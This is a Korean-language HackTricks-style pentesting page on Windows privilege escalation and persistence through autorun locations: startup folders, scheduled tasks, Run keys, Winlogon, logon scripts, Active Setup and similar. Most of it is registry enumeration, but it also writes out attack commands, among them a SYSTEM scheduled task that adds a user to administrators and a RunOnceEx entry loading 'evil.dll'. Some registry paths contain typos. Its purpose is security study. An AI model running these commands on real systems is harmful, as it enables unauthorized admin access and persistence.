# Autoruns를 이용한 Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic**를 사용하여 **startup** 시 프로그램을 실행할 수 있습니다. 다음 명령으로 startup 시 실행되도록 설정된 바이너리를 확인합니다:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## 예약된 작업

**작업**은 **특정 주기**로 실행되도록 예약할 수 있습니다. 다음 명령을 사용하여 실행되도록 예약된 바이너리를 확인하세요:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## 폴더

**Startup 폴더에 있는 모든 바이너리는 startup 시 실행됩니다**. 일반적인 startup 폴더는 다음에 나열된 폴더이지만, startup 폴더는 registry에 지정됩니다. [위치를 확인하려면 여기를 읽어보세요.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* 취약점(예: WinRAR 7.13 이전 버전에서 악용된 CVE-2025-8088)을 이용하면 **압축 해제 중 이러한 Startup 폴더 내부에 payload를 직접 배치**하여 다음 사용자의 로그온 시 code execution을 유발할 수 있습니다. 이 technique에 대한 자세한 내용은 다음을 참조하세요:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [여기에서 가져온 참고 사항](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** registry entry는 64-bit Windows 버전을 실행 중임을 나타냅니다. 운영 체제는 이 key를 사용하여 64-bit Windows 버전에서 실행되는 32-bit applications에 대해 HKEY_LOCAL_MACHINE\SOFTWARE의 별도 view를 표시합니다.

### Runs

**일반적으로 알려진** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** 및 **RunOnce**로 알려진 registry keys는 사용자가 system에 로그인할 때마다 programs를 자동으로 실행하도록 설계되었습니다. key의 data value에 할당되는 command line은 260자 이하여야 합니다.<sup>[[2]](#references)</sup>

**Service runs** (boot 중 services의 automatic startup을 제어할 수 있음):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista 및 이후 versions에서는 **Run** 및 **RunOnce** registry keys가 자동으로 생성되지 않습니다. 이러한 keys의 entries는 programs를 직접 시작하거나 해당 programs를 dependencies로 지정할 수 있습니다. 예를 들어 로그온 시 DLL file을 load하려면 "Depend" key와 함께 **RunOnceEx** registry key를 사용할 수 있습니다. 이는 system start-up 중 "C:\temp\evil.dll"을 실행하도록 registry entry를 추가하는 방법으로 확인할 수 있습니다.<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: **HKLM** 내에 언급된 registry 중 어느 곳에든 쓸 수 있다면, 다른 사용자가 로그인할 때 privileges를 escalate할 수 있습니다.

> [!TIP]
> **Exploit 2**: **HKLM** 내 registry에 지정된 binary 중 어느 것이든 덮어쓸 수 있다면, 다른 사용자가 로그인할 때 해당 binary를 backdoor로 수정하여 privileges를 escalate할 수 있습니다.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup 경로

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** 폴더에 배치된 바로 가기는 사용자가 로그온하거나 시스템이 재부팅될 때 서비스 또는 애플리케이션을 자동으로 실행합니다. **Startup** 폴더의 위치는 **Local Machine** 및 **Current User** 범위 모두에 대해 레지스트리에 정의되어 있습니다. 즉, 지정된 **Startup** 위치에 추가된 바로 가기는 로그온 또는 재부팅 프로세스 후 연결된 서비스나 프로그램이 시작되도록 하므로, 프로그램이 자동으로 실행되도록 예약하는 간단한 방법이 됩니다.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> **HKLM** 아래의 \[User] Shell Folder를 덮어쓸 수 있다면, 이를 자신이 제어하는 폴더를 가리키도록 설정하고 사용자가 시스템에 로그인할 때마다 실행되어 권한을 상승시키는 backdoor를 배치할 수 있습니다.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

이 사용자별 레지스트리 값은 해당 사용자가 로그온할 때 실행되는 script 또는 command를 지정할 수 있습니다. 주로 영향을 받는 사용자 context에서만 실행되므로 **persistence** primitive이지만, post-exploitation 및 autoruns 검토 중에도 확인할 가치가 있습니다.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 현재 사용자의 이 값을 수정할 수 있다면 admin rights 없이도 다음 interactive logon 시 실행을 다시 트리거할 수 있습니다. 다른 사용자의 hive에 이 값을 기록할 수 있다면 해당 사용자가 로그온할 때 code execution을 얻을 수 있습니다.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
참고 사항:

- 대상 사용자가 이미 읽을 수 있는 `.bat`, `.cmd`, `.ps1` 또는 기타 launcher 파일에는 전체 경로를 사용하는 것이 좋습니다.
- 값이 제거될 때까지 로그오프/재부팅 후에도 유지됩니다.
- `HKLM\...\Run`과 달리, 이것만으로 elevation이 부여되지는 않습니다. 이는 사용자 범위의 persistence입니다.

### Winlogon 키

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

일반적으로 **Userinit** 키는 **userinit.exe**로 설정됩니다. 그러나 이 키가 수정되면, 지정된 executable도 사용자가 logon할 때 **Winlogon**에 의해 실행됩니다. 마찬가지로 **Shell** 키는 Windows의 기본 shell인 **explorer.exe**를 가리키도록 설정됩니다.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> registry value 또는 binary를 overwrite할 수 있다면 privileges를 escalate할 수 있습니다.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** key를 확인합니다.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Safe Mode 명령 프롬프트 변경

Windows Registry의 `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`에는 기본적으로 `cmd.exe`로 설정된 **`AlternateShell`** 값이 있습니다. 즉, 시작 중에 F8 키를 눌러 "Safe Mode with Command Prompt"를 선택하면 `cmd.exe`가 사용됩니다. 하지만 F8 키를 누르고 수동으로 선택하지 않아도 컴퓨터가 자동으로 이 모드로 시작되도록 설정할 수 있습니다.

"Safe Mode with Command Prompt"로 자동 시작되는 boot option을 생성하는 단계:<sup>[[5]](#references)</sup>

1. `boot.ini` 파일의 attributes를 변경하여 read-only, system 및 hidden flags를 제거합니다: `attrib c:\boot.ini -r -s -h`
2. 편집을 위해 `boot.ini`를 엽니다.
3. 다음과 같은 줄을 삽입합니다: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini`의 변경 사항을 저장합니다.
5. 원래 파일 attributes를 다시 적용합니다: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** registry key를 변경하면 custom command shell을 설정할 수 있어 unauthorized access에 악용될 가능성이 있습니다.
- **Exploit 2 (PATH Write Permissions):** 시스템 **PATH** variable의 어느 부분이든 write permissions가 있으면, 특히 `C:\Windows\system32`보다 앞선 위치에 write permissions가 있을 경우 custom `cmd.exe`를 실행할 수 있습니다. 시스템이 Safe Mode로 시작되면 이는 backdoor가 될 수 있습니다.
- **Exploit 3 (PATH and boot.ini Write Permissions):** `boot.ini`에 대한 writing access가 있으면 automatic Safe Mode startup을 활성화하여 다음 reboot에서 unauthorized access를 가능하게 할 수 있습니다.

현재 **AlternateShell** 설정을 확인하려면 다음 commands를 사용합니다:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup은 **desktop environment가 완전히 로드되기 전에 시작되는** Windows 기능입니다. 특정 명령의 실행을 우선 처리하며, 해당 명령이 완료되어야 user logon이 진행됩니다. 이 프로세스는 Run 또는 RunOnce registry sections에 있는 항목과 같은 다른 startup entries가 실행되기 전에도 발생합니다.

Active Setup은 다음 registry keys를 통해 관리됩니다:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

이러한 keys에는 다양한 subkeys가 있으며, 각 subkey는 특정 component에 해당합니다. 특히 중요한 key values는 다음과 같습니다:

- **IsInstalled:**
- `0`은 component의 command가 실행되지 않음을 나타냅니다.
- `1`은 각 user에 대해 command가 한 번 실행됨을 의미하며, `IsInstalled` value가 없을 때의 default behavior입니다.
- **StubPath:** Active Setup이 실행할 command를 정의합니다. `notepad` 실행과 같은 유효한 command line이면 무엇이든 사용할 수 있습니다.

**Security Insights:**

- **`IsInstalled`**가 `"1"`로 설정되어 있고 특정 **`StubPath`**가 지정된 key를 수정하거나 작성하면 unauthorized command execution이 발생할 수 있으며, 이는 잠재적으로 privilege escalation으로 이어질 수 있습니다.
- 충분한 permissions가 있다면 모든 **`StubPath`** value가 참조하는 binary file을 변경하는 방법으로도 privilege escalation을 달성할 수 있습니다.

Active Setup components 전체에서 **`StubPath`** configurations를 확인하려면 다음 commands를 사용할 수 있습니다:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Browser Helper Objects (BHOs) 개요

Browser Helper Objects (BHOs)는 Microsoft Internet Explorer에 추가 기능을 제공하는 DLL 모듈입니다. BHO는 Internet Explorer와 Windows Explorer가 시작될 때마다 해당 프로세스에 로드됩니다. 하지만 **NoExplorer** 키를 1로 설정하면 실행을 차단할 수 있으며, 이 경우 Windows Explorer 인스턴스와 함께 로드되지 않습니다.<sup>[[1]](#references)</sup>

BHO는 Internet Explorer 11을 통해 Windows 10에서 사용할 수 있지만, 최신 버전의 Windows에서 기본 브라우저인 Microsoft Edge에서는 지원되지 않습니다.

시스템에 등록된 BHO를 확인하려면 다음 레지스트리 키를 검사할 수 있습니다.

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

각 BHO는 레지스트리에서 고유 식별자 역할을 하는 **CLSID**로 표시됩니다. 각 CLSID에 대한 자세한 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`에서 확인할 수 있습니다.

레지스트리에서 BHO를 조회하려면 다음 명령을 사용할 수 있습니다:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

레지스트리에는 각 dll마다 하나의 새 레지스트리 항목이 포함되며, 이는 **CLSID**로 표시됩니다. `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`에서 CLSID 정보를 확인할 수 있습니다.

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### 열기 명령

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

autoruns를 찾을 수 있는 모든 사이트는 이미 [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)에 의해 **검색됩니다**. 그러나 **자동 실행되는** 파일의 더 포괄적인 목록을 확인하려면 systinternals의 [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)를 사용할 수 있습니다:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## 추가 정보

**다음에서 레지스트리와 같은 더 많은 Autoruns 찾기** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [일반적인 malware persistence mechanisms](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart categories (Windows Sysinternals Tools 문제 해결, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [alternate shell을 시작하는 boot option을 추가하려면 어떻게 해야 하나요?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit 2026년 4월 3일 Wrap-Up](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
